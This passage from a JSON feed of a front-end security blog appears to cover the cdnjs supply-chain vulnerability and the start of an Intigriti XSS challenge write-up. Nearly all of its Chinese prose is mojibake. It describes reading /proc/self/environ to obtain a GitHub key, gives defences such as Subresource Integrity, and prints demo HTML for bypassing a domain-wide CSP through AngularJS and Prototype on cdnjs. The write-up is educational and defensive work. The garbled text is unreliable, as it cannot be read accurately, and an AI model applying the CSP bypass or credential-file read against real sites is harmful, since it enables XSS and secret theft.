<code>/proc/self/environ</code>ï¼ˆä»–æœ¬ä¾†æ˜¯æƒ³è®€å¦ä¸€å€‹ <code>/proc/self/maps</code>ï¼‰ï¼Œé€™è£¡é¢æœ‰è‘—ç’°å¢ƒè®Šæ•¸ï¼Œè€Œä¸”æœ‰ä¸€æŠŠ GitHub çš„ api key ä¹Ÿåœ¨è£¡é¢ï¼Œé€™æŠŠ key å° cdnjs åº•ä¸‹çš„ repo æœ‰å¯«å…¥æ¬Šé™ï¼Œæ‰€ä»¥åˆ©ç”¨é€™æŠŠ keyï¼Œå¯ä»¥ç›´æ¥å»æ”¹ cdnjs æˆ–æ˜¯ cdnjs ç¶²ç«™çš„ç¨‹å¼ç¢¼ï¼Œé€²è€Œæ§åˆ¶æ•´å€‹æœå‹™ã€‚</p>\n<p>ä»¥ä¸Šå°±æ˜¯é—œæ–¼ cdnjs æ¼æ´çš„è§£é‡‹ï¼Œæƒ³çœ‹æ›´å¤šæŠ€è¡“ç´°ç¯€æˆ–æ˜¯è©³ç´°ç™¼å±•çš„è©±ï¼Œå¯ä»¥å»çœ‹åŸä½œè€…çš„éƒ¨è½æ ¼æ–‡ç« ï¼Œè£¡é¢è¨˜éŒ„äº†è¨±å¤šç´°ç¯€ã€‚ç¸½ä¹‹å‘¢ï¼Œå°±ç®—æ˜¯å¤§å…¬å¸åœ¨ç¶­è­·çš„æœå‹™ï¼Œä¹Ÿæ˜¯æœ‰è¢«å…¥ä¾µçš„é¢¨éšªå­˜åœ¨ã€‚</p>\n<p>è€Œ Cloudflare ä¹Ÿåœ¨ä¸€é€±å¾Œç™¼ä½ˆäº†äº‹ä»¶è™•ç†å ±å‘Šï¼š<a href=\"https://blog.cloudflare.com/cloudflares-handling-of-an-rce-vulnerability-in-cdnjs/\">Cloudflare's Handling of an RCE Vulnerability in cdnjs</a>ï¼Œè¨˜éŒ„äº†äº‹æƒ…ç™¼ç”Ÿçš„å§‹æœ«ä»¥åŠäº‹å¾Œçš„ä¿®è£œæªæ–½ï¼Œä»–å€‘æŠŠæ•´å€‹æ¶æ§‹éƒ½é‡å¯«äº†ï¼ŒæŠŠåŸæœ¬è§£å£“ç¸®çš„éƒ¨åˆ†æ”¾åˆ° Docker sandbox è£¡é¢ï¼Œå¢åŠ äº†æ•´é«”çš„å®‰å…¨æ€§ã€‚</p>\n<h2 id=\"%E8%BA%AB%E7%82%BA%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%EF%BC%8C%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E8%BA%AB%E7%82%BA%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%EF%BC%8C%E8%A9%B2%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6%EF%BC%9F\">#</a> èº«ç‚ºå‰ç«¯å·¥ç¨‹å¸«ï¼Œè©²å¦‚ä½•é˜²ç¦¦ï¼Ÿ</h2>\n<p>é‚£æˆ‘å€‘ç©¶ç«Ÿè©²å¦‚ä½•é˜²ç¦¦é€™é¡å‹çš„æ¼æ´ï¼Ÿæˆ–æä¸å¥½ï¼Œæˆ‘å€‘æ ¹æœ¬é˜²ç¦¦ä¸äº†ï¼Ÿ</p>\n<p>ç€è¦½å™¨å…¶å¯¦æœ‰æä¾›ä¸€å€‹åŠŸèƒ½ï¼šã€Œå¦‚æœæª”æ¡ˆè¢«ç«„æ”¹éï¼Œå°±ä¸è¦è¼‰å…¥ã€ï¼Œé€™æ¨£åƒ…ç®¡ cdnjs è¢«å…¥ä¾µï¼ŒjQuery çš„æª”æ¡ˆè¢«ç«„æ”¹ï¼Œæˆ‘çš„ç¶²ç«™ä¹Ÿä¸æœƒè¼‰å…¥æ–°çš„ jQuery æª”æ¡ˆï¼Œå…æ–¼æª”æ¡ˆæ±¡æŸ“çš„æ”»æ“Šã€‚</p>\n<p>åœ¨ cdnjs ä¸Šé¢ï¼Œç•¶ä½ æ±ºå®šè¦ç”¨æŸä¸€å€‹ library çš„æ™‚å€™ï¼Œä½ å¯ä»¥é¸æ“‡è¦è¤‡è£½ URL é‚„æ˜¯è¤‡è£½ script tagï¼Œè‹¥æ˜¯é¸æ“‡å¾Œè€…ï¼Œå°±æœƒå¾—åˆ°é€™æ¨£çš„å…§å®¹ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><br>    <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.production.min.js<span class=\"token punctuation\">\"</span></span><br>    <span class=\"token attr-name\">integrity</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>sha512-TS4lzp3EVDrSXPofTEu9VDWDQb7veCZ5MOm42pzfoNEVqccXWvENKZfdm5lH2c/NcivgsTDw9jVbK+xeYfzezw==<span class=\"token punctuation\">\"</span></span><br>    <span class=\"token attr-name\">crossorigin</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>anonymous<span class=\"token punctuation\">\"</span></span><br>    <span class=\"token attr-name\">referrerpolicy</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>no-referrer<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"><br></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></code></pre>\n<p><code>crossorigin=&quot;anonymous&quot;</code> é€™å€‹æˆ‘åœ¨ä¹‹å‰çš„æ–‡ç« ï¼š<a href=\"https://blog.huli.tw/2021/07/10/cookie-bomb/\">åˆ©ç”¨ Cookie ç‰¹æ€§é€²è¡Œçš„ DoS æ”»æ“Šï¼šCookie ç‚¸å½ˆ</a>æœ‰æéï¼Œåˆ©ç”¨ CORS çš„æ–¹å¼é€å‡º requestï¼Œå¯ä»¥é¿å…æŠŠ cookie ä¸€èµ·å¸¶åˆ°å¾Œç«¯å»ã€‚</p>\n<p>è€Œä¸Šé¢çš„å¦ä¸€å€‹æ¨™ç±¤ <code>integrity</code> æ‰æ˜¯é˜²ç¦¦çš„é‡é»ï¼Œé€™å€‹å±¬æ€§æœƒè®“ç€è¦½å™¨å¹«ä½ ç¢ºèªè¦è¼‰å…¥çš„è³‡æºæ˜¯å¦ç¬¦åˆæä¾›çš„ hash å€¼ï¼Œå¦‚æœä¸ç¬¦åˆçš„è©±ï¼Œå°±ä»£è¡¨æª”æ¡ˆè¢«ç«„æ”¹éï¼Œå°±ä¸æœƒè¼‰å…¥è³‡æºã€‚æ‰€ä»¥ï¼Œå°±ç®— cdnjs è¢«å…¥ä¾µäº†ï¼Œé§­å®¢æ›¿æ›æ‰äº†æˆ‘åŸæœ¬ä½¿ç”¨çš„ react.jsï¼Œç€è¦½å™¨ä¹Ÿæœƒå› ç‚º hash å€¼ä¸åˆï¼Œä¸æœƒè¼‰å…¥è¢«æ±¡æŸ“éçš„ç¨‹å¼ç¢¼ã€‚</p>\n<p>æƒ³çŸ¥é“æ›´å¤šçš„è©±å¯ä»¥åƒè€ƒ MDNï¼Œä¸Šé¢æœ‰ä¸€é  <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity\">Subresource Integrity</a> å°ˆé–€åœ¨è¬›é€™å€‹ã€‚</p>\n<p>ä¸éé€™ç¨®æ–¹æ³•åªèƒ½é˜²æ­¢ã€Œå·²ç¶“å¼•å…¥çš„ scriptã€è¢«ç«„æ”¹ï¼Œå¦‚æœç¢°å·§åœ¨é§­å®¢ç«„æ”¹æª”æ¡ˆä¹‹å¾Œæ‰è¤‡è£½ scriptï¼Œé‚£å°±æ²’æœ‰ç”¨äº†ï¼Œå› ç‚ºé‚£æ™‚å€™çš„æª”æ¡ˆå·²ç¶“æ˜¯ç«„æ”¹éçš„æª”æ¡ˆäº†ã€‚</p>\n<p>æ‰€ä»¥å¦‚æœè¦å®Œå…¨é¿å…é€™å€‹é¢¨éšªï¼Œå°±æ˜¯ä¸è¦ç”¨é€™äº›ç¬¬ä¸‰æ–¹æä¾›çš„æœå‹™ï¼ŒæŠŠé€™äº› library æ”¾åˆ°è‡ªå·±å®¶çš„ CDN ä¸Šé¢å»ï¼Œé€™æ¨£é¢¨éšªå°±å¾ç¬¬ä¸‰æ–¹çš„é¢¨éšªï¼Œè®Šæˆäº†è‡ªå·±å®¶æœå‹™çš„é¢¨éšªã€‚é™¤éè‡ªå·±å®¶çš„æœå‹™è¢«æ‰“ä¸‹ä¾†ï¼Œä¸ç„¶é€™äº› library æ‡‰è©²ä¸æœƒå‡ºäº‹ã€‚</p>\n<p>è€Œç¾åœ¨è¨±å¤šç¶²ç«™å› ç‚º library éƒ½æœƒç¶“ç”± webpack é€™é¡å‹çš„ bundler é‡æ–°åˆ‡åˆ†ï¼Œæ‰€ä»¥æ²’æœ‰è¾¦æ³•ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ library CDNï¼Œä¸€å®šæœƒæ”¾åœ¨è‡ªå·±å®¶çš„ç¶²ç«™ä¸Šï¼Œä¹Ÿå°±æ’é™¤äº†é€™é¡å‹çš„ä¾›æ‡‰éˆæ”»æ“Šã€‚</p>\n<p>å¯æ˜¯è¦æ³¨æ„çš„æ˜¯ï¼Œä½ ä»ç„¶é¿å…ä¸äº†å…¶ä»–ä¾›æ‡‰éˆæ”»æ“Šçš„é¢¨éšªã€‚å› ç‚ºå„˜ç®¡æ²’æœ‰ç”¨ç¬¬ä¸‰æ–¹çš„ library CDNï¼Œé‚„æ˜¯éœ€è¦å¾åˆ¥çš„åœ°æ–¹ä¸‹è¼‰é€™äº›å‡½å¼åº«å°å§ï¼Ÿä¾‹å¦‚èªª npmï¼Œä½ çš„å‡½å¼åº«ä¾†æºå¯èƒ½æ˜¯é€™è£¡ï¼Œæ„æ€å°±æ˜¯å¦‚æœ npm è¢«å…¥ä¾µäº†ï¼Œä¸Šé¢çš„æ–‡ä»¶è¢«ç«„æ”¹ï¼Œé‚„æ˜¯æœƒå½±éŸ¿åˆ°ä½ çš„æœå‹™ã€‚é€™å°±æ˜¯ä¾›æ‡‰éˆæ”»æ“Šï¼Œä¸ç›´æ¥æ”»æ“Šä½ ï¼Œè€Œæ˜¯å¾å…¶ä»–ä¸Šæ¸¸æ»²é€é€²ä¾†ã€‚</p>\n<p>ä¸éé€™é¡å‹çš„é¢¨éšªå¯ä»¥åœ¨ build time çš„æ™‚å€™é€éä¸€äº›éœæ…‹æƒæçš„æœå‹™ï¼Œçœ‹èƒ½ä¸èƒ½æŠ“å‡ºè¢«ç«„æ”¹çš„æª”æ¡ˆæˆ–æ˜¯æƒ¡æ„ç¨‹å¼ç¢¼ï¼Œæˆ–ä¹Ÿæœ‰å…¬å¸æœƒåœ¨å…§éƒ¨æ¶ä¸€å€‹ npm registryï¼Œä¸ç›´æ¥èˆ‡å¤–é¢çš„ npm åŒæ­¥ï¼Œç¢ºä¿ä½¿ç”¨åˆ°çš„å‡½å¼åº«ä¸æœƒè¢«ç«„æ”¹ã€‚</p>\n<h2 id=\"%E9%A1%8D%E5%A4%96%E9%A2%A8%E9%9A%AA%EF%BC%9Acsp-%E7%9A%84%E7%B9%9E%E9%81%8E\"><a class=\"direct-link\" href=\"#%E9%A1%8D%E5%A4%96%E9%A2%A8%E9%9A%AA%EF%BC%9Acsp-%E7%9A%84%E7%B9%9E%E9%81%8E\">#</a> é¡å¤–é¢¨éšªï¼šCSP çš„ç¹é</h2>\n<p>é™¤äº†ä¸Šé¢æåˆ°çš„ä¾›æ‡‰éˆå®‰å…¨é¢¨éšªä»¥å¤–ï¼Œå…¶å¯¦ä½¿ç”¨ç¬¬ä¸‰æ–¹ JS é‚„æœ‰å¦ä¸€å€‹æ½›åœ¨é¢¨éšªï¼Œå°±æ˜¯ CSP(Content Security Policy) çš„ç¹éã€‚ç¾åœ¨æœ‰è¨±å¤šç¶²ç«™éƒ½æœƒè¨­ç½® CSPï¼Œé˜»æ“‹ä¸ä¿¡ä»»çš„ä¾†æºï¼Œä¾‹å¦‚èªªåªå…è¨±æŸå€‹ domain çš„ JS æª”æ¡ˆï¼Œæˆ–æ˜¯ä¸é–‹æ”¾ inline event è·Ÿ eval ç­‰ç­‰ã€‚</p>\n<p>å¦‚æœä½ çš„ç¶²ç«™æœ‰ç”¨åˆ° cdnjs çš„è…³æœ¬ï¼Œä½ çš„ CSP è£¡é¢å‹¢å¿…æœƒæœ‰ <code>https://cdnjs.cloudflare.com</code> é€™å€‹ç¶²å€ã€‚æ¯”èµ·å®Œæ•´çš„è·¯å¾‘ï¼Œæ¯”è¼ƒå¤šäººæœƒå‚¾å‘å…è¨±æ•´å€‹ domain çš„æ±è¥¿ï¼Œå› ç‚ºä½ å¯èƒ½ç”¨åˆ°å¤šå€‹ libraryï¼Œæ‡¶å¾—ä¸€å€‹ä¸€å€‹æ–°å¢ä¸Šå»ã€‚</p>\n<p>é€™æ™‚å€™è‹¥æ˜¯ç¶²ç«™æœ‰è‘— XSS æ¼æ´ï¼Œä¸€èˆ¬æƒ…æ³ä¸‹ CSP æ‡‰è©²æœƒæœ‰é˜²ç¦¦ä½œç”¨ï¼Œé˜»æ­¢é€™äº›ä¸ä¿¡ä»»çš„ç¨‹å¼ç¢¼çš„åŸ·è¡Œã€‚ä½†å¾ˆéºæ†¾åœ°ï¼ŒCSP ä¸­ <code>https://cdnjs.cloudflare.com</code> çš„é€™å€‹è·¯å¾‘ï¼Œè®“æ”»æ“Šè€…å¯ä»¥è¼•é¬†ç¹é CSPã€‚</p>\n<p>å…ˆè¬›ä¸€ä¸‹åŸç†ï¼ŒåŸç†å°±æ˜¯ cdnjs ä¸Šé™¤äº†ä½ æƒ³è¦ç”¨çš„ library ä¹‹å¤–ï¼Œé‚„æœ‰åƒåƒè¬è¬å€‹ä¸åŒçš„ libraryï¼Œè€Œæœ‰äº› library æœ¬èº«æä¾›çš„åŠŸèƒ½ï¼Œè®“æ”»æ“Šè€…ä¸éœ€è¦åŸ·è¡Œ JSï¼Œä¹Ÿèƒ½åŸ·è¡Œä»»æ„ç¨‹å¼ç¢¼ã€‚</p>\n<p>ä¾‹å¦‚èªª AngularJSï¼Œåœ¨èˆŠç‰ˆæœ¬ä¸­æœ‰è‘— <a href=\"https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs\">Client-Side Template Injection</a> çš„æ¼æ´ï¼Œåªéœ€è¦ HTML å°±å¯ä»¥åŸ·è¡Œç¨‹å¼ç¢¼ï¼Œåƒæ˜¯é€™é¡ã€Œåˆ©ç”¨å…¶ä»–åˆæ³•çš„ script å¹«åŠ©ä½ åŸ·è¡Œæ”»æ“Šç¨‹å¼ç¢¼ã€çš„æ‰‹æ³•ï¼Œå«åš script gadgetsï¼Œæƒ³çŸ¥é“æ›´å¤šå¯ä»¥åƒè€ƒï¼š<a href=\"https://github.com/google/security-research-pocs/tree/master/script-gadgets\">security-research-pocs/script-gadgets</a></p>\n<p>å‡è¨­æˆ‘å€‘ç¾åœ¨çš„ CSP åªå…è¨± <code>https://cdnjs.cloudflare.com</code>ï¼Œè©²æ€éº¼ç¹éå‘¢ï¼Ÿæˆ‘æ‰¾åˆ°é€™å…©å€‹å¾ˆæ£’çš„è³‡æºï¼š</p>\n<ol>\n<li><a href=\"https://blog.0daylabs.com/2016/09/09/bypassing-csp/\">Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup</a></li>\n<li><a href=\"https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22\">H5SC Minichallenge 3: &quot;Shï¼Št, it's CSP!&quot;</a></li>\n</ol>\n<p>åªè¦åˆ©ç”¨ AngularJS + Prototype é€™å…©å€‹ libraryï¼Œå°±å¯ä»¥åœ¨ç¬¦åˆ CSPï¼ˆåªå¼•å…¥ cdnjs åº•ä¸‹çš„è…³æœ¬ï¼‰çš„æƒ…æ³ä¸‹é€²è¡Œ XSSï¼Œæˆ‘åšäº†ä¸€å€‹ç°¡å–®çš„ demoï¼š<a href=\"https://aszx87410.github.io/demo/csp_bypass/cdnjs.html\">https://aszx87410.github.io/demo/csp_bypass/cdnjs.html</a></p>\n<p>å®Œæ•´ç¨‹å¼ç¢¼å¦‚ä¸‹ï¼š</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>en<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>CSP bypass<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Security-Policy<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>default-src <span class=\"token punctuation\">'</span>none<span class=\"token punctuation\">'</span>; script-src https://cdnjs.cloudflare.com<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">ng-app</span> <span class=\"token attr-name\">ng-csp</span><span class=\"token punctuation\">></span></span><br>      <br>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span><br><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code></pre>\n<p>æƒ³è¦é¿å…é€™ç¨® CSP bypassï¼Œå°±åªèƒ½æŠŠ CSP ä¸­ cdnjs çš„è·¯å¾‘å¯«æ­»ï¼ŒæŠŠæ•´å€‹è…³æœ¬çš„ URL å¯«ä¸Šå»ï¼Œè€Œä¸æ˜¯åªå¯« domainã€‚å¦å‰‡ï¼Œé€™é¡å‹çš„ CSP å…¶å¯¦æœƒå¹«åŠ©æ”»æ“Šè€…æ›´å®¹æ˜“çªç ´ CSP çš„é™åˆ¶ï¼Œé€²è€ŒåŸ·è¡Œ XSS æ”»æ“Šã€‚</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>æ”»æ“Šæ‰‹æ³•åƒåƒç™¾ç™¾ç¨®ï¼Œç™¼ç¾ cdnjs æ¼æ´çš„ç ”ç©¶å“¡è¿‘æœŸé¾æƒ…æ–¼ supply chain attackï¼Œä¸åª cdnjsï¼Œé€£ <a href=\"https://blog.ryotak.me/post/homebrew-security-incident-en/\">Homebrew</a> è·Ÿ <a href=\"https://blog.ryotak.me/post/pypi-potential-remote-code-execution-en/\">PyPI</a> ç”šè‡³æ˜¯ <a href=\"https://blog.ryotak.me/post/definitelytyped-tamper-with-arbitrary-packages-en/\">@types</a> ä¹Ÿéƒ½è¢«æ‰¾åˆ°æ¼æ´ã€‚</p>\n<p>å¦‚æœè¦ç›´æ¥åœ¨é é¢ä¸Šç”¨ script å¼•å…¥ç¬¬ä¸‰æ–¹çš„ç¶²å€ï¼Œè¨˜å¾—å…ˆç¢ºèªå°æ–¹çš„ç¶²ç«™æ˜¯å€¼å¾—ä¿¡ä»»çš„ï¼Œå¦‚æœå¯ä»¥çš„è©±ä¹Ÿè«‹åŠ ä¸Š integrity å±¬æ€§ï¼Œé¿å…æª”æ¡ˆè¢«ç«„æ”¹ï¼Œé€£å¸¶å½±éŸ¿åˆ°è‡ªå·±çš„æœå‹™ã€‚ä¹Ÿè¦æ³¨æ„ CSP çš„è¨­å®šï¼Œå°æ–¼ cdnjs é€™ç¨®ç¶²ç«™ï¼Œè‹¥æ˜¯åªè¨­ç½® domain çš„è©±ï¼Œå·²ç¶“æœ‰äº†å¯è¡Œçš„ç¹éæ‰‹æ³•ï¼Œåœ¨è¨­ç½®å‰è«‹å¤šåŠ æ³¨æ„ã€‚</p>\n<p>åœ¨è«‡åˆ°å‰ç«¯çš„å®‰å…¨æ™‚ï¼Œå¤§å®¶ç¬¬ä¸€å€‹æœƒæƒ³åˆ° XSSï¼Œç¬¬äºŒå€‹æœƒæƒ³åˆ° CSRFï¼Œç„¶å¾Œå¯èƒ½å°±æ²’äº†ã€‚é€™ç¯‡æ–‡ç« å¸Œæœ›è—‰ç”± cdnjs çš„æ¼æ´è®“å‰ç«¯å·¥ç¨‹å¸«å€‘èªè­˜ä»€éº¼æ˜¯ä¾›æ‡‰éˆæ”»æ“Šã€‚åªè¦æœ‰æ„è­˜åˆ°é€™å€‹æ”»æ“Šæ‰‹æ³•ï¼Œæ—¥å¾Œåœ¨é–‹ç™¼æ™‚å°±æœƒå¤šç•™æ„ä¸€äº›ï¼Œå°±æœƒæ³¨æ„åˆ°å¼•å…¥ç¬¬ä¸‰æ–¹ library æ‰€å¸¶ä¾†çš„é¢¨éšªã€‚</p>\n",
      "date_published": "2021-08-09T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/learn-from-intigriti-xss-0721/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/learn-from-intigriti-xss-0721/",
      "title": "Intigriti ä¸ƒæœˆä»½ XSS æŒ‘æˆ°ï¼šçªç ´å±¤å±¤é—œå¡",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<!-- å¾ä¸€é¡Œ XSS çš„é¡Œç›®ä¸­çªç ´å±¤å±¤é—œå¡ï¼Œå­¸ç¿’å„ç¨®å‰ç«¯ç›¸é—œçŸ¥è­˜ -->\n<!-- summary -->\n<p><a href=\"https://www.intigriti.com/\">Intigriti</a> é€™å€‹ç¶²ç«™æ¯å€‹æœˆéƒ½æœƒæœ‰ XSS æŒ‘æˆ°ï¼Œçµ¦ä½ ä¸€é€±çš„æ™‚é–“å»è§£ä¸€é“ XSS çš„é¡Œç›®ï¼Œç›®æ¨™æ˜¯æˆåŠŸåŸ·è¡Œ <code>alert(document.domain)</code>ã€‚</p>\n<p>èº«ç‚ºä¸€å€‹å‰ç«¯è³‡å®‰æ··è¡€å·¥ç¨‹å¸«ï¼Œæˆ‘æ¯å€‹æœˆéƒ½æœ‰åƒåŠ ï¼ˆä½†ä¸ä¸€å®šæœ‰è§£å‡ºä¾†ï¼‰ï¼Œåº•ä¸‹æ˜¯å‰å¹¾å€‹æœˆçš„ç­†è¨˜ï¼š</p>\n<ol>\n<li><a href=\"https://blog.huli.tw/2021/05/25/xss-challenge-by-intigriti-writeup/\">è§£é¡Œå¿ƒå¾—ï¼šIntigriti's 0421 XSS challengeï¼ˆä¸Šï¼‰</a></li>\n<li><a href=\"https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/\">Intigritiâ€™s 0521 XSS æŒ‘æˆ°è§£æ³•ï¼šé™å®šå­—å…ƒçµ„åˆç¨‹å¼ç¢¼</a></li>\n<li><a href=\"https://blog.huli.tw/2021/07/03/xss-challenge-intigriti-june-review/\">Intigriti å…­æœˆä»½ XSS æŒ‘æˆ°æª¢è¨</a></li>\n</ol>\n<p>æ¯å€‹æœˆçš„æŒ‘æˆ°éƒ½ç›¸ç•¶æœ‰è¶£ï¼Œæˆ‘è¦ºå¾—é›£æ˜“åº¦ä¹ŸæŒæ¡å¾—ä¸éŒ¯ï¼Œæ²’æœ‰åˆ°è¶…ç´šç„¡æ•µé›£ï¼Œä½†ä¹Ÿä¸æœƒè¼•æ˜“åˆ°ä¸€ä¸‹å°±è¢«è§£é–‹ã€‚è€Œé€™å€‹æœˆçš„æŒ‘æˆ°æˆ‘ä¹Ÿè¦ºå¾—å¾ˆå¥½ç©ï¼Œå› æ­¤åœ¨è§£é–‹ä¹‹å¾Œå¯«äº†é€™ç¯‡å¿ƒå¾—è·Ÿå¤§å®¶åˆ†äº«ï¼ŒæœŸå¾…æœ‰è¶Šä¾†è¶Šå¤šäººå¯ä»¥ä¸€èµ·åƒèˆ‡ã€‚</p>\n<p>æŒ‘æˆ°ç¶²å€ï¼š<a href=\"https://challenge-0721.intigriti.io/\">https://challenge-0721.intigriti.io/</a></p>\n<h2 id=\"%E5%88%86%E6%9E%90%E9%A1%8C%E7%9B%AE\"><a class=\"direct-link\" href=\"#%E5%88%86%E6%9E%90%E9%A1%8C%E7%9B%AE\">#</a> åˆ†æé¡Œç›®</h2>\n<p>ä»”ç´°çœ‹ä¸€ä¸‹æœƒç™¼ç¾é€™æ¬¡çš„æŒ‘æˆ°å…¶å¯¦æ¯”è¼ƒè¤‡é›œä¸€é»ï¼Œå› ç‚ºæœ‰ä¸‰å€‹é é¢è·Ÿä¸€å †çš„ <code>postMessage</code> é‚„æœ‰ <code>onmessage</code>ï¼Œè¦ææ¸…æ¥šä»–å€‘çš„é—œä¿‚éœ€è¦ä¸€äº›æ™‚é–“ã€‚</p>\n<p>æˆ‘çœ‹äº†ä¸€ä¸‹ä¹‹å¾Œå› ç‚ºæ‡¶å¾—ææ‡‚ï¼Œæ‰€ä»¥æ±ºå®šå¾åæ–¹å‘é–‹å§‹è§£ã€‚å¦‚æœæ˜¯ XSS é¡Œç›®ï¼Œä»£è¡¨ä¸€å®šè¦æœ‰åœ°æ–¹å¯ä»¥åŸ·è¡Œç¨‹å¼ç¢¼ï¼Œé€šå¸¸éƒ½æ˜¯ <code>eval</code> æˆ–æ˜¯ <code>innerHTML</code>ï¼Œæ‰€ä»¥å¯ä»¥å…ˆæ‰¾åˆ°é€™é‚Šï¼Œå†å¾€å›æ¨è©²å¦‚ä½•æŠµé”ã€‚</p>\n<p>æ¥ä¸‹ä¾†å°±ä¾†ç°¡å–®çœ‹ä¸€ä¸‹é‚£ä¸‰å€‹é é¢ï¼š</p>\n<ol>\n<li>index.html</li>\n<li>htmledit.php</li>\n<li>console.php</li>\n</ol>\n<h3 id=\"index.html\"><a class=\"direct-link\" href=\"#index.html\">#</a> index.html</h3>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-container<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><br> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>card-header-small<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Your payloads:<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span><br> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span 